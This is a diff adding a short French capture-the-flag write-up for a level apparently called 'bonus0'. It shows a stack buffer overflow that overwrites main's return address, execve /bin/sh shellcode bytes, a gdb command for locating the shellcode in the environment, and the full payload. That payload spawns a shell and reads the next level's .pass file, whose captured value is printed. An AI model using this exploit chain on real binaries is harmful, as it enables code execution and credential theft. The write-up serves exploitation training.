@@ -1,0 +1,31 @@
+le program read 2 fois sur stdin dans des buffer de 20 bytes
+si on met 2 fois 20 character le eip de main est ecrase
+
+les cccc vont remplace la valeur de eip de main
+AAAAAAAAAAAAAAAAAAAA
+BBBBBBBBBccccBBBBBBB
+
+nasm -f elf shellcode.asm
+shellcode to execute
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+
+on inject notre shellcode dans une variables d'environement nomme SHELLCODE
+
+pour trouve l'addres de la variables d'environement SHELLCODE
+env -i SHELLCODE="$(python -c 'print "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')" gdb -q ./bonus0 -ex 'b main' -ex 'run' -ex 'x/200s *((char **)environ)' -ex 'set confirm off' -ex 'quit' | grep 'SHELLCODE'
+
+
+"A"*4095 pour remplire le premier buffer de read
+"B"*9+"\xbf\xff\xff\xbf"+"B"*7 pour le deuxieme buffer avec l'address qui va remplace le eip de main et execute le shellcode
+
+$ python -c 'print "A"*4095+"\n"+"B"*9+"\xbf\xff\xff\xbf"+"B"*7' > /tmp/bonus0_content
+
+
+$ echo "cat /home/user/bonus1/.pass" > /tmp/bonus0_cmd
+$ cat /tmp/bonus0_content - | env -i SHELLCODE="$(python -c 'print "\x90"*30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')" ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBBBBBB����BBBBBBB��� BBBBBBBBB����BBBBBBB���
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
